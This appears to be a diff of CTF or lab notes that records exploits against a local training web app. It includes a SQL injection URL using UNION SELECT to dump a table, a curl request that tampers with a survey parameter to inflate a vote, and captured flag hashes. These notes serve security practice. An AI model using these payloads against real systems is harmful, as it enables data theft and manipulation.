@@ -48,3 +48,12 @@ ________________________________________________________________________________
 -SQLI images:
 http://10.12.1.130/index.php?page=searchimg&id=1%20OR%201=1%20union%20select%20title,comment%20from%20list_images&Submit=Submit#
 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
+
+
+________________________________________________________________________
+
+Survey incrementation
+http://10.12.1.130/?page=survey#
+curl 'http://10.12.1.130/?page=survey#' --data 'sujet=2&valeur=5000'
+03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
+
